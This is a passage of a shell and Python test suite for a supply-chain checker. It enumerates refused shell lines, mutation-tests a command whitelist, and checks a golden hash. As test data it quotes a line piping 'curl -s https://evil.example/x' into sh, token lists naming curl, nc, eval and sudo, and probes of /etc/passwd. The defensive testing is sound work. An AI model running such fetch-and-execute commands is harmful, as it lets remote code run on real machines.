# BODY command position, before a command, BODY argument, grep option, inside a double-quoted pattern, test operator, separator, after a pipe, as a
# substitution, exit status, ARG name and path), plus the refused corpus. One case per class; each line must be refused.
cat >"$work/hf_enum.py" <<'PY'
import importlib.util, json, os, subprocess, sys
# hf_enum.py JUDGE.py SKIP.py REFUSED.tsv OUT.json: every token class OUTSIDE SKIP's HARNESS_WHITELIST, in every position it can take, judged by JUDGE's parser.
# The universe of tokens is fixed here (every character, every keyword and builtin bash lists, the external commands, every test operator, a broad set of grep
# options, every variable name bash lists plus the specials), so widening the whitelist by one token turns an expected refusal into an acceptance.
def load(p, n):
    spec = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
J, S = load(sys.argv[1], "judge_mod"), load(sys.argv[2], "skip_mod")
W = S.HARNESS_WHITELIST
def bash_lists():
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            if r.returncode == 0 and r.stdout.strip().isdigit() and int(r.stdout) >= 5:
                g = lambda f: subprocess.run(["env", "-i", p, "--norc", "--noprofile", "-c", "compgen " + f], capture_output=True, text=True, stdin=subprocess.DEVNULL).stdout.split()
                return g("-k"), g("-b"), g("-v")
    return [], [], []
kw, bi, vs = bash_lists()
KEYWORDS = sorted(set(kw) | {"if", "then", "else", "elif", "fi", "case", "esac", "for", "select", "while", "until", "do", "done", "in", "function", "time", "coproc", "{", "}", "!", "[[", "]]"})
BUILTINS = sorted(set(bi) | {"eval", "source", ".", "exec", "command", "builtin", "let", "declare", "typeset", "local", "readonly", "export", "read", "mapfile", "readarray",
                             "printf", "echo", "set", "unset", "shift", "trap", "alias", "enable", "hash", "type", "cd", "pushd", "ulimit", "umask", "wait", "kill", "true", "false", ":"})
EXTERNAL = ["curl", "wget", "sh", "bash", "zsh", "dash", "python3", "perl", "ruby", "node", "nc", "ssh", "scp", "env", "xargs", "find", "awk", "sed", "tee", "dd", "rm", "cp",
            "mv", "ln", "chmod", "ls", "touch", "cmd", "git", "gh", "openssl", "base64", "tar", "unzip", "install", "sudo", "nohup", "timeout", "watch", "egrep", "fgrep", "zgrep"]
WORDS = sorted(set(KEYWORDS + BUILTINS + EXTERNAL) | {"$x", "$1", "$(cmd)", "`cmd`", "${x}", "$[1]", "$((1))", "a[1]", "x=1", "*", "?", "~", "-", "--", "'a'", "\\a"})
TEST_OPS = ["-a", "-b", "-c", "-d", "-e", "-f", "-g", "-h", "-k", "-p", "-r", "-s", "-t", "-u", "-w", "-x", "-G", "-L", "-N", "-O", "-S", "-z", "-n", "-o", "-v", "-R",
            "=", "==", "!=", "<", ">", "=~", "-ef", "-nt", "-ot", "-eq", "-ne", "-lt", "-le", "-gt", "-ge", "!", "(", ")", "-A", "-l"]
GREP_OPTS = ["-f", "-e", "-r", "-R", "-P", "-z", "-o", "-l", "-L", "-n", "-c", "-i", "-x", "-w", "-F", "-G", "-A", "-B", "-C", "-H", "-h", "-s", "-U", "-a", "-I", "-m", "-b",
             "-d", "-D", "-T", "-Z", "--file", "--file=x", "--include=*", "--exclude=*", "--null", "--color", "--regexp", "--recursive", "-Ef", "-qf", "-E", "-q", "-v", "-Eq", "-vq", "--"]
VARS = sorted(set(vs) | {"0", "1", "9", "@", "*", "#", "?", "-", "$", "!", "_", "HOME", "PATH", "IFS", "BASH_ENV", "ENV", "PS4", "u", "x", "other", "Work", "works",
                         "WORK", "CALL", "calls", "CALLS2", "CALLSx", "wor", "w"})
CHARS = [chr(c) for c in range(128)] + ["é", " ", " ", "﻿"]
SEPS = ["&", ";;", "|&", "&>", ">", "<", ">>", "<<", "<<<", ">|", "<>", "(", ")", "{", "}", "`", "\n", "\r", "&&&", "|||", ";&", ";;&"] + CHARS
EXITS = ["10", "-1", "x", "1 2", "01", "\"1\"", "$x", "256", "9 9", "\"$1\""] + [c for c in CHARS]
BODY = lambda b, args=' _ "$CALLS"': "t \"r\" \"x\" bash -c '" + b + "'" + args
L = []
def case(cls, line, reason=None): L.append((cls, line, reason))
for c in CHARS:
    if c not in W["rule_title_chars"]:
        case("a character outside rule_title_chars, in the RULE", 't "r' + c + '" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
        case("a character outside rule_title_chars, in the TITLE", 't "r" "x' + c + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
    if c not in W["line_chars"]:
        case("a character outside line_chars (refused for that reason)", 't "r" "x' + c + '" bash -c \'grep -q . "$1"\' _ "$CALLS"', "line character set")
    if c not in W["dquote_chars"]:
        case("a character outside dquote_chars, in a double-quoted pattern", BODY('grep -q -- "a' + c + 'b" "$1"'))
    if "\\" + c not in W["dquote_escapes"]:
        case("a backslash sequence outside dquote_escapes", BODY('grep -q -- "a\\' + c + 'b" "$1"'))
    if c not in " \t" and c not in W["grep_options"] and c not in W["grep_bare_patterns"]:
        case("a character as an unquoted grep pattern", BODY('grep -q -- ' + c + ' "$1"'))
        if c not in W["grep_options"]:
            case("a character as an unquoted grep option", BODY('grep -q ' + c + ' -- "a" "$1"'))
    if c not in " \t":
        case("a character in BODY command position", BODY(c + ' "$1"'))
        case("a character glued to a command word", BODY('grep' + c + ' -q -- . "$1"'))
    if c not in W["arg_path_chars"]:
        case("a character outside arg_path_chars, in an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS/x' + c + '"')
for s in SEPS:
    if s not in W["separators"] and s not in " \t":
        case("a separator outside separators", BODY('grep -q -- "a" "$1" ' + s + ' grep -q -- "b" "$1"'))
for w in WORDS:
    if w not in W["commands"]:
        case("a word outside commands, in BODY command position", BODY(w + ' "$1"'))
        case("a word outside commands, after a negation", BODY('! ' + w + ' "$1"'))
    if w not in W["grep_options"] and w not in W["grep_bare_patterns"]:
        case("a word as an unquoted grep option", BODY('grep -q ' + w + ' -- "a" "$1"'))
        case("a word as an unquoted grep pattern", BODY('grep -q -- ' + w + ' "$1"'))
    if w not in W["pipe_into"]:
        case("a word outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + w + ' "$1"'))
    if w not in W["substitutions"]:
        case("a word outside substitutions, as a substitution command", BODY('test "$(' + w + ' -- "$1")" = "a"'))
    case("a word as an unquoted ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ ' + w)
for w in sorted(set(WORDS) | set(CHARS)):
    if w not in W["negation"] and w not in W["commands"] and w not in " \t":
        case("a word before a command (outside negation)", BODY(w + ' grep -q -- . "$1"'))
        case("a word before a test expression (outside negation)", BODY('test ' + w + ' -f "$1"'))
for c in W["commands"]:
    if c not in W["pipe_into"]:
        case("a command outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + {"cat": 'cat -- "$1"', "test": 'test -f "$1"', "[": '[ -f "$1" ]', "exit": "exit 1"}.get(c, c + ' "$1"')))
for o in TEST_OPS:
    if o not in W["test_unary"]:
        case("a test operator outside test_unary (OP X)", BODY('test ' + o + ' "$1"'))
        case("a [ operator outside test_unary (OP X)", BODY('[ ' + o + ' "$1" ]'))
    if o not in W["test_string"] and o not in W["test_count"]:
        case("a test operator outside test_string / test_count (X OP Y)", BODY('test "$1" ' + o + ' "a"'))
        case("a test operator outside test_string / test_count (N OP N)", BODY('test 1 ' + o + ' 2'))
for o in GREP_OPTS:
    if o not in W["grep_options"]:
        case("a grep option outside grep_options", BODY('grep ' + o + ' -- "a" "$1"'))
        case("a grep option outside grep_options, in the count substitution", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
for e in EXITS:
    if e not in W["exit_status"] and e not in " \t":
        case("an exit status outside exit_status", BODY('grep -q -- "a" "$1" && exit ' + e))
for v in VARS:
    if v not in W["arg_names"]:
        case("a variable outside arg_names, as an ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '"')
        case("a variable outside arg_names, as an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '/x"')
        if not (len(v) == 1 and v in "123456789"):                    # "$1".."$9" whole is the positional the whitelist names
            case("a variable in a double-quoted pattern", BODY('grep -q -- "$' + v + '" "$1"'))
        case("a variable as an unquoted BODY argument", BODY('grep -q -- $' + v + ' "$1"'))
        case("a variable in the TITLE", 't "r" "x $' + v + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
QOPTS = sorted(set(GREP_OPTS) | {"--file=/etc/hosts", "--file=pats", "--version", "--pager=touch M", "--filter=cmd", "--view", "--regexp=x", "-e", "-f", "-r", "-E", "-q", "-v", "-Eq", "--", "-", "-c"})
for o in QOPTS:
    case("an option-like word DOUBLE-QUOTED in a grep option position", BODY('grep "' + o + '" -- "a" "$1"'))
    case("an option-like word DOUBLE-QUOTED as the grep pattern", BODY('grep -q -- "' + o + '" "$1"'))
    case("an option-like word DOUBLE-QUOTED as a grep file operand", BODY('grep -q -- "a" "' + o + '"'))
    case("an option-like word DOUBLE-QUOTED in the count substitution's option position", BODY('test "$(grep -c "' + o + '" -- "a" "$1")" -ge 1'))
    case("an option-like word DOUBLE-QUOTED as the count substitution's pattern", BODY('test "$(grep -c -- "' + o + '" "$1")" -ge 1'))
    if o not in W["grep_options"] and o != W["end_of_options"]:
        case("an option-like word BARE in a grep option position", BODY('grep -q ' + o + ' -- "a" "$1"'))
        case("an option-like word BARE in the count substitution's option position", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
    case("an option-like word BARE after end_of_options (a second option, or a bare pattern)", BODY('grep -q -- ' + o + ' "a" "$1"'))
    case("an option-like word as cat's operand", BODY('test "$(cat -- "' + o + '")" = "a"'))
for op in W["test_unary"]:
    for v in ('"/etc/passwd"', '"x"', '"$(cat -- "$1")"', '"$(grep -c -- "a" "$1")"', '1', '.', '"$2"'):
        case("a file-test operand that is not a positional within the arguments", BODY('test ' + op + ' ' + v))
        case("a file-test operand that is not a positional within the arguments, [ form", BODY('[ ' + op + ' ' + v + ' ]'))
    case("a file test with an extra argument", BODY('test ' + op + ' "$1" "$1"'))
for extra in ('"$1"', 'x', '"a"', '--'):
    case("cat with more than one operand", BODY('test "$(cat -- "$1" ' + extra + ')" = "a"'))
    case("cat with more than one operand, as a command", BODY('cat -- "$1" ' + extra))
case("grep without end_of_options before the pattern", BODY('grep -q "a" "$1"'))
case("grep without end_of_options, in the count substitution", BODY('test "$(grep -c "a" "$1")" -ge 1'))
case("cat without end_of_options", BODY('test "$(cat "$1")" = "a"'))
case("cat without end_of_options, as a command", BODY('cat "$1"'))
case("more ARGs than max_args", 't "r" "x" bash -c \'grep -q -- . "$1"\' _' + ' "$CALLS"' * (W["max_args"] + 1))
for l in open(sys.argv[3]).read().split("\n"):
    if l:
        what, line = l.split("\t", 1); case("the refused corpus: " + what, line)
out = {"classes": {}, "total": len(L), "accepted": 0, "wrong_reason": 0}   # accepted: an expected refusal was ACCEPTED; wrong_reason: refused, but not for the expected reason
for cls, line, reason in L:
    d = out["classes"].setdefault(cls, {"n": 0, "accepted": [], "wrong_reason": []}); d["n"] += 1
    try:
        J.judge(line)
    except J.Refused as e:
        if reason is not None and reason not in str(e):
            d["wrong_reason"].append(repr(line)[:160]); out["wrong_reason"] += 1
        continue
    d["accepted"].append(repr(line)[:160]); out["accepted"] += 1
json.dump(out, open(sys.argv[4], "w"), indent=1)
PY
python3 "$work/hf_enum.py" "$work/harness_form.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$work/hf-enum.json" </dev/null
python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness enumeration:', r['total'], 'lines in', len(r['classes']), 'classes,', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$work/hf-enum.json"
while IFS= read -r cls; do
  CASE="AC16 harness enumeration: refused in every case ($cls)"
  check python3 -c "import json,sys; d=json.load(open(sys.argv[1]))['classes'][sys.argv[2]]; assert d['n'] > 0 and not d['accepted'] and not d['wrong_reason'], (d['accepted'][:5], d['wrong_reason'][:5])" "$work/hf-enum.json" "$cls"
done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith('the refused corpus: ')]" "$work/hf-enum.json")
CASE="AC16 harness enumeration: at least 3000 lines in at least 30 classes, none accepted and none refused for another reason"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 3000 and len([k for k in r['classes'] if not k.startswith('the refused')]) >= 30 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
# --- CODE mutants: the role rules that live in the parser's code are loosened one at a time in a temp copy; the enumeration and the refused corpus must
# then find an unexpected acceptance (or a refusal for another reason). A surviving mutant means no case pins that rule.
hcm=$(mktemp -d "$work/hfcode.XXXXXX")
while IFS=$'\t' read -r what old new; do
  python3 - "$work/harness_form.py" "$hcm/m.py" "$old" "$new" <<'PY'
import sys
s = open(sys.argv[1]).read(); assert s.count(sys.argv[3]) == 1, sys.argv[3]
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PY
  python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
  CASE="AC16 harness code mutant: $what is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hcm/e.json"
done <<'EOF'
a file-test operand may be any operand (Codex R6)	args[0][1] in W["test_unary"] and args[1][2] == "pos": return	args[0][1] in W["test_unary"] and operand(args[1]): return
cat takes at least, not exactly, its operands (Sonnet R6)	if len(rest) != len(want) or any(	if len(rest) < len(want) or any(
a positional may name an argument that is not there	if t[2] == "pos" and int(t[1]) > len(args): raise	if t[2] == "pos" and int(t[1]) > 9: raise
EOF
# --- the GOLDEN whitelist (Sonnet, PR 289 round 5: the mutation run catches only the widenings it lists; a security control fails closed). The sha256 of
# HARNESS_WHITELIST as canonical JSON (sorted keys, no spaces, ASCII) must equal HARNESS_WHITELIST_GOLDEN below: ANY change to the grammar, a widening
# the mutation list does not name included, turns this suite red. Changing the grammar is therefore two deliberate edits in one reviewed diff: the
# whitelist, and this golden value (whose new value the failing case prints).
HARNESS_WHITELIST_GOLDEN=b2584723ffad2283b2d195aff694c38669d7746ef2e1dfe2520207768060371d
cat >"$work/hf_gold.py" <<'PY'
import hashlib, importlib.util, json, sys
spec = importlib.util.spec_from_file_location("hf", sys.argv[1]); m = importlib.util.module_from_spec(spec)
sys.argv = [sys.argv[1], "--file", "/dev/null"]   # harness_form.py judges only when run as a script: importing it runs nothing
spec.loader.exec_module(m)
print(hashlib.sha256(json.dumps(m.HARNESS_WHITELIST, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()).hexdigest())
PY
hfg=$(python3 "$work/hf_gold.py" "$work/harness_form.py" </dev/null)
CASE="AC16 harness whitelist: HARNESS_WHITELIST equals the reviewed golden (canonical sha256 $HARNESS_WHITELIST_GOLDEN; this tree's whitelist hashes to $hfg)"
check test "$hfg" = "$HARNESS_WHITELIST_GOLDEN"
hgd=$(mktemp -d "$work/hfgold.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hgd/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  CASE="AC16 harness whitelist: a widening the mutation list does not name ($what) changes the canonical hash, so the golden check is red"
  check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" != "$HARNESS_WHITELIST_GOLDEN"
done <<'EOF'
commands + xargs (Sonnet R4)	HARNESS_WHITELIST["commands"].append("xargs")
pipe_into + sh (Sonnet R4)	HARNESS_WHITELIST["pipe_into"].append("sh")
grep_options + -P (Sonnet R4)	HARNESS_WHITELIST["grep_options"].append("-P")
; in rule_title_chars (Sonnet R4)	HARNESS_WHITELIST["rule_title_chars"] += ";"
grep_options + -vq	HARNESS_WHITELIST["grep_options"].append("-vq")
a new key	HARNESS_WHITELIST["extra"] = []
a reordered list (order is part of the reviewed text)	HARNESS_WHITELIST["commands"].reverse()
EOF
python3 - "$work/harness_form.py" "$hgd/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
CASE="AC16 harness whitelist: a no-op patch keeps the canonical hash (the golden check detects change, not noise)"
check test "$(python3 "$work/hf_gold.py" "$hgd/m.py" </dev/null)" = "$HARNESS_WHITELIST_GOLDEN"
# --- MUTATION run (like pip-pin's): a temp copy of harness_form.py with HARNESS_WHITELIST widened by ONE token; the enumeration (positions and skips from
# the real whitelist) and the refused corpus must then report at least one line the real whitelist refuses for the expected reason that the mutant either
# ACCEPTS (an unexpected acceptance) or refuses for ANOTHER reason (the newline and CR line_chars mutants: the shape still refuses those lines, so they
# change the reason, not the verdict). The two counts are reported apart. A mutant with neither means the suite does not pin the whitelist.
cat >"$work/hf-mut.tsv" <<'EOF'
commands + curl	HARNESS_WHITELIST["commands"].append("curl")
commands + sh	HARNESS_WHITELIST["commands"].append("sh")
commands + eval	HARNESS_WHITELIST["commands"].append("eval")
commands + bash	HARNESS_WHITELIST["commands"].append("bash")
test_unary + -v	HARNESS_WHITELIST["test_unary"].append("-v")
test_unary + -R	HARNESS_WHITELIST["test_unary"].append("-R")
test_unary + -n	HARNESS_WHITELIST["test_unary"].append("-n")
test_string + ==	HARNESS_WHITELIST["test_string"].append("==")
test_count + -nt	HARNESS_WHITELIST["test_count"].append("-nt")
arg_names + other	HARNESS_WHITELIST["arg_names"].append("other")
arg_names + HOME	HARNESS_WHITELIST["arg_names"].append("HOME")
separators + &	HARNESS_WHITELIST["separators"].append("&")
separators + >	HARNESS_WHITELIST["separators"].append(">")
pipe_into + cat	HARNESS_WHITELIST["pipe_into"].append("cat")
grep_options + -f	HARNESS_WHITELIST["grep_options"].append("-f")
grep_options + -e	HARNESS_WHITELIST["grep_options"].append("-e")
grep_bare_patterns + *	HARNESS_WHITELIST["grep_bare_patterns"].append("*")
exit_status + 10	HARNESS_WHITELIST["exit_status"].append("10")
rule_title_chars + $	HARNESS_WHITELIST["rule_title_chars"] += "$"
rule_title_chars + backtick	HARNESS_WHITELIST["rule_title_chars"] += "`"
rule_title_chars + '	HARNESS_WHITELIST["rule_title_chars"] += "'"
dquote_chars + $	HARNESS_WHITELIST["dquote_chars"] += "$"
dquote_chars + backtick	HARNESS_WHITELIST["dquote_chars"] += "`"
dquote_chars + backslash	HARNESS_WHITELIST["dquote_chars"] += "\\"
dquote_chars + !	HARNESS_WHITELIST["dquote_chars"] += "!"
dquote_escapes + \$	HARNESS_WHITELIST["dquote_escapes"].append("\\$")
line_chars + newline	HARNESS_WHITELIST["line_chars"] += "\n"
line_chars + CR	HARNESS_WHITELIST["line_chars"] += "\r"
arg_path_chars + *	HARNESS_WHITELIST["arg_path_chars"] += "*"
arg_path_chars + $	HARNESS_WHITELIST["arg_path_chars"] += "$"
substitutions + ls	HARNESS_WHITELIST["substitutions"]["ls"] = ""
max_args 9 -> 10	HARNESS_WHITELIST["max_args"] = 10
negation + -	HARNESS_WHITELIST["negation"].append("-")
end_of_options not required	HARNESS_WHITELIST["end_of_options"] = ""
pattern may start with -	HARNESS_WHITELIST["pattern_first_char_not"] = ""
grep_options + --file=pats	HARNESS_WHITELIST["grep_options"].append("--file=pats")
dquote_escapes + \-	HARNESS_WHITELIST["dquote_escapes"].append("\\-")
EOF
hfm=$(mktemp -d "$work/hfmut.XXXXXX")
while IFS=$'\t' read -r what patch; do
  python3 - "$work/harness_form.py" "$hfm/m.py" "$patch" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
  python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
  CASE="AC16 harness mutation: widening HARNESS_WHITELIST by one token ($what) is caught (an unexpected acceptance, or a refusal for another reason)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hfm/e.json"
  python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness mutation', sys.argv[2] + ':', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$hfm/e.json" "$what"
done <"$work/hf-mut.tsv"
CASE="AC16 harness mutation: the enumeration reports unexpected acceptances and refusals for a different reason separately (fields accepted and wrong_reason)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert 'wrong_reason' in r and 'accepted' in r and all('accepted' in d and 'wrong_reason' in d for d in r['classes'].values())" "$work/hf-enum.json"
for m in newline CR; do
  CASE="AC16 harness mutation: line_chars + $m is caught as refusals for a different reason, with 0 unexpected acceptances (the shape still refuses the line)"
  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] > 0, (r['accepted'], r.get('wrong_reason'))" "$hfm/e-line_chars + $m.json"
done
CASE="AC16 harness mutation: the unmutated copy (a no-op patch) is NOT flagged (the mutation run detects widening, not noise)"
python3 - "$work/harness_form.py" "$hfm/m.py" "pass" <<'PY'
import sys
s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
PY
python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
import hashlib, json, re, shlex, subprocess, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
    "bdc2f348c4dbc92f8ca94dab85de3c9a9ed425448bfb5bdac5e45f6c233a5bf8": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
    "59026aa06d9188a1b90b3ccd57dd0fc2c05bdf90654072b8740477e87155080f": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
    "6acbb0aa471b0e3b827df73e7e9c0b3aa3491f7b5c0ff669654a74c868f9794c": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
    "77bc505e9228dc4a97d322a7e255a51b972f5087ffc3bf67f167b74b155311d5": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
    "22312bde0463f438dcaf03137157a7b17959af299e9e30867c442547056c3ecf": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
    "5839155d14e99a00fc2d9e031c95573d67aeb3904a33c4d969c74bc4bc6b7541": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
    "80510e8b8f509a47ab7454a6f43e99a36191fe86249cd876a41a0e7dd9829ac2": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
    "9f54b594e70eb20f0d0a70ff9277164bd82cc360e18f5b20a78e04f3f13bbf27": "cat >\"$stubs/curl\" <<'EOF'",
    "1314309c3220e61914631f086c3994102c0cbca29603c9e177a888747643d67e": "echo \"curl $*\" >>\"$CALLS\"",
    "64612fb9a9fe82bebee266d20bfd151d4aab8c5a1d02f1a3dfadde2b97938277": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
    # the fetch tool's one-word lines of the refresh job and its test (cache#344, handoff 0432): printf -v of a constant, text for the checker
    "99057ac9634caaa646bb8cc9a98c2964199e00a63063ae02e08b96bdb544d596": "printf -v FETCH %s curl",
}
SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call" and "context" not in r and not r["ruling"].startswith(("live fetch, owner ratified (", "pinned toolchain fetch, advisor reading Oct 16 (", "loopback fetch, advisor reading Oct 17 (", "build-container install, advisor reading Oct 19: ", "pinned fetch, advisor reading Oct 17 ("))]   # those name an item, not a text line (AC19); a row with a context is proved from its file at scan time instead (below); a live fetch row is a command, checked by its own inventory (the next case)
assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
for r in rows:
    line = LINES[r["key"]]
    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
    assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
    if line.startswith("t "):                                            # the harness assertion form: harness_form.py decides, nothing else applies
        hr = subprocess.run([sys.executable, sys.argv[2], line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
        assert hr.returncode == 0 and hr.stdout.startswith("harness assertion"), ("not a harness assertion line", hr.stdout, r)
        continue
    assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
    if line.startswith("#"):
        continue                                                         # a comment
    if subprocess.run(["bash", "-n", "-c", line], capture_output=True, stdin=subprocess.DEVNULL).returncode:
        assert re.match(r"^(for \w+ in \(|assert |ENVPK = \[\(|same-step\) |else )", line), ("a syntax error of an unexpected kind", line)
        if not line.startswith(("same-step) ", "else ")):
            continue                                                     # Python source: bash cannot parse it, nothing runs
    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
    cmds, cur = [], []
    for tok in lex:                                                      # quote-aware: a | inside a quoted string is text, not a pipe
        if tok in (";", ";;", "|", "||", "&&", "&"):
            cmds.append(cur); cur = []
        else:
            cur.append(tok)
    cmds.append(cur)
    for c in cmds:
        while c and c[0] in ("else", "then", "do"):
            c = c[1:]
        if len(c) > 1 and c[1] == ")":
            c = c[2:]                                                    # a case pattern: word)
        if c:
            assert c[0] in SAFE, ("not a harmless command", c, r)
PY
CASE="every committed live-fetch row is one of the three fetch lines of bin/refresh-inputs.sh: the test holds each line's text, its hashes match the row, the checker's own live-fetch rule accepts it, and the same line with another program is refused"
check python3 - "$root/.github/supply-chain-exceptions.json" "$chk" <<'PY'
import hashlib, importlib.util, json, re, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
FLAGS = "-q -fsSL -g --max-filesize {n} --max-time {t} --proto =https --tlsv1.2 -o"
KEY = '/usr/bin/curl ' + FLAGS.format(n=65536, t=60) + ' "$tmp/live-key.pub" https://packages.wolfi.dev/os/wolfi-signing.rsa.pub || die "could not fetch the live Wolfi signing key" 1'
PKG = '/usr/bin/curl ' + FLAGS.format(n=536870912, t=900) + ' "$tmp/dl/$f" "https://packages.wolfi.dev/os/$p" || die "could not download a package from live Wolfi" 1'
IDX = '/usr/bin/curl ' + FLAGS.format(n=268435456, t=600) + ' "$tmp/dl/$f" "https://packages.wolfi.dev/os/$p" || die "could not download the live package index" 1'
LIVE = {H(l): l for l in (KEY, PKG, IDX)}
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith(ac.LIVE_RULING)]
assert sorted(r["line"] for r in rows) == sorted(LIVE), ("the live rows are not exactly the three fetch lines", [r["line"][:12] for r in rows])
for r in rows:
    line = LIVE[r["line"]]
    assert r["file"] == "bin/refresh-inputs.sh" and r["form"] == "a download", r
    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
    assert r["key"] == H(segs[0]) and segs[0].startswith("/usr/bin/curl "), ("the key is not the hash of the curl segment", r)
    assert r["key"] != H(segs[1]), ("the key is the hash of the error handler", r)
    assert segs[1].startswith("die "), segs[1]
    assert ac._live_fetch_line_ok(line), ("the checker's live-fetch rule refuses the line", line)
    other = line.replace("/usr/bin/curl", "/usr/bin/other", 1)
    assert not ac._live_fetch_line_ok(other), ("another program is accepted", other)
assert next(r for r in rows if r["line"] == H(KEY))["count"] == 4
assert [r.get("count", 1) for r in sorted(rows, key=lambda r: r["line"])] == [c for _, c in sorted((h, 4 if h == H(KEY) else 1) for h in LIVE)], "the counts are exactly 4, 1, 1"
PY
CASE="the committed Go-toolchain row is exactly the one go.dev fetch line of bin/refresh-inputs.sh: its text, its hashes (the key is the curl segment), the checker's Go rule accepts it, the same line with another program, under the Wolfi rule, or with another host is refused"
check python3 - "$root/.github/supply-chain-exceptions.json" "$chk" <<'PY'
import hashlib, importlib.util, json, re, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
